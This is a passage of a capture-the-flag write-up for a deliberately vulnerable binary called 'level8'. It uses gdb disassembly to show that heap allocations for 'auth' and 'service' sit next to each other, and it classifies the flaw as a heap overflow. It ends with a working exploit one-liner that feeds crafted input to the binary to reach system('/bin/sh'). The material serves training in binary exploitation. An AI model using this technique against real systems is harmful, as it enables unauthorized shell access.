...
- #### Use gdb to get the assembly of the program and tracking instructions.
    - #### Functions that used in this programme.
        ```c
        0x080483c4  _init
        0x08048410  printf
        0x08048420  free
        ...
        0x080487ec  _fini
        ```
    - #### Asssembly code of main function.
        ```c
        ...
        0x08048738 <+468>:   ret 
        ```
        #### The assembly is too long this time becuace there is a will loop. i will take just some important parts.  
        ```c
        0x08048569 <+5>:     and    $0xfffffff0,%esp
        0x0804856c <+8>:     sub    $0xa0,%esp
        0x08048572 <+14>:    jmp    0x8048575 <main+17>
        0x08048574 <+16>:    nop
        0x08048575 <+17>:    mov    0x8049ab0,%ecx // globale variable service.
        0x0804857b <+23>:    mov    0x8049aac,%edx // globale variable auth.
        0x08048581 <+29>:    mov    $0x8048810,%eax
        0x08048586 <+34>:    mov    %ecx,0x8(%esp)
        0x0804858a <+38>:    mov    %edx,0x4(%esp)
        0x0804858e <+42>:    mov    %eax,(%esp)
        ...
        (gdb) 
        ```
        #### We see two global variables `auth` and `service` stored in global and static variables segment and a call of printf to print the address that each one of thoes two variables point to.
        ```c
        0x080485e4 <+128>:   movl   $0x4,(%esp)
        0x080485eb <+135>:   call   0x8048470 <malloc@plt>
        0x080485f0 <+140>:   mov    %eax,0x8049aac // allocate 4 bytes for auth variable.
        ...
        0x08048631 <+205>:   mov    0x8049aac,%eax
        0x08048636 <+210>:   mov    %edx,0x4(%esp)
        0x0804863a <+214>:   mov    %eax,(%esp)
        0x0804863d <+217>:   call   0x8048460 <strcpy@plt> // pass auth ot strcpy (auth is 'char *').
        ...
        0x080486a8 <+324>:   mov    %eax,(%esp)
        0x080486ab <+327>:   call   0x8048430 <strdup@plt>
        0x080486b0 <+332>:   mov    %eax,0x8049ab0 // asigne the return of strdup to service (service is char *).
        0x080486b5 <+337>:   lea    0x20(%esp),%eax
        ...
        0x080486e2 <+382>:   mov    0x8049aac,%eax // mov the addrress of auth to eax.
        0x080486e7 <+387>:   mov    0x20(%eax),%eax // add 0x20 (32) byte to auth address.
        0x080486ea <+390>:   test   %eax,%eax // check if auth + 32 byte is none zero
        0x080486ec <+392>:   je     0x80486ff <main+411> // if its zero jumb else call system
        0x080486ee <+394>:   movl   $0x8048833,(%esp)
        0x080486f5 <+401>:   call   0x8048480 <system@plt>
        ...
        (gdb) x/s 0x8048833
        0x8048833:       "/bin/sh"
        ```
        #### Our target is calling `system` function to call it we need to make the condition true so we should put none zero value in the address of `auth` + 32 byte.
- #### Get the approximate code source.
    ```c
        #include <stdio.h>
        #include <stdlib.h>
        #include <string.h>
    ...
    ```
    #### Now everything is clear; we can see exactly how to make `auth` + 32 non-zero, even though `auth` allocates just 4 bytes. The program checks, before using `strcpy`, if the `input` is less than 35, but we have `service`, which takes the return of `strdup`. The good news is that addresses in the heap are sequential, so if we allocate `auth` and then allocate `service` via `strdup`, the address of `service` will follow the address of `auth` with a small gap.
    ```c
        ...
        0x804a008, (nil) 
        service
        0x804a008, 0x804a018 // the addresses of auth and service.
    ```
    #### The gap in hex is `0x804a018 - 0x804a008 = 0x10` which is `16` byte so:
    ####  `auth` + 16 = `service` => `auth` + 32 = `service` + 16

- #### Vulnrability type: Heap Overflow.
- #### Solution command.
    ```sh
    (python -c 'print("auth \n"+"service"+"1"*16+"\n"+"login")'; cat) | ./level8
    ```
    #### First write `"auth \n"`; it will allocate 4 bytes and assign the address to `auth`. Then write `"service" + "1"*16 + "\n"`, so the program will allocate a string with 16 1's in the heap using the `strdup` function and assign the address to `service`. Then the value at the address of `auth` + 32 bytes refers to `"\n"`, so it is a non-zero value, which means the `system` function will be called and run the shell.